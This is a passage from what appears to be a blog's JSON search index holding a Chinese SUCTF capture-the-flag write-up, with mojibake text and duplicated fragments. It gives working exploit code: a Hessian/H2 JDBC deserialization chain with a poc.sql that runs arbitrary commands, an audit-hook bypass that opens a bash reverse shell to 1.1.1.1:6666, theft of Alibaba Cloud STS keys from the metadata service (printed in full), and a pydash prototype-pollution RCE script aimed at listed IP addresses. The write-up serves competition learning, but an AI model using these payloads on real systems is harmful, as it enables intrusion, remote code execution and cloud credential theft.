java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: 